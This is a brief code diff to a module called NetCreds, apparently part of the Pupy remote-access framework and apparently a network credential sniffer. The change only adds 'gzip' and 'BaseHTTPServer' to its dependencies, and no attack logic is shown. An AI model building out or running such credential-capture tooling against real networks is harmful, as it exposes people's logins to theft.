@@ -15,7 +15,7 @@ class NetCreds(PupyModule):
     """
     daemon=True
     unique_instance=True
-    dependencies=['scapy']
+    dependencies=['scapy', 'gzip', 'BaseHTTPServer']
 
     def init_argparse(self):
         self.arg_parser = PupyArgumentParser(prog='netcreds', description=self.__doc__)
